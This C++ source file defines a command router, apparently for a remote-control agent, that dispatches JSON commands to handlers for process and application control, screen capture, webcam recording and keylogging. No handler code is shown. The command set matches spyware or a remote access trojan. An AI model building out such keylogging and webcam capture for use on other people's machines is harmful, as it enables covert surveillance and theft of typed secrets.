#include "Router.h"

json Router::dispatch(const std::unordered_map<std::string, Handler>& map, const json& req) {
    std::string cmd = req.value("command", "");
    if (map.find(cmd) != map.end())
        return map.at(cmd)(req);

    return { {"type","error"}, {"message","unknown command: " + cmd} };
}

void Router::registerAllHandlers(std::unordered_map<std::string, Handler>& map) {
    map["list_processes"]    = ProcessHandlers::listProcesses;
    map["start_process"]     = ProcessHandlers::startProcess;
    map["stop_process_pid"]  = ProcessHandlers::stopProcessPid;

    map["list_applications"] = ProcessHandlers::listApps;
    map["start_application"] = ProcessHandlers::startApp;
    map["stop_application"]  = ProcessHandlers::stopApp;

    map["capture_screen"]    = ProcessHandlers::captureScreen;
    map["capture_screen"]        = ProcessHandlers::captureScreen;
    map["start_webcam_record"]   = ProcessHandlers::startWebcamRecord; // ĐỔI TÊN LỆNH
    map["stop_webcam_record"]    = ProcessHandlers::stopWebcamRecord; // THÊM LỆNH DỪNG

    map["start_keylog"]      = ProcessHandlers::startKeylog;
    map["stop_keylog"]       = ProcessHandlers::stopKeylog;
    
    map["help"]              = ProcessHandlers::help;
}
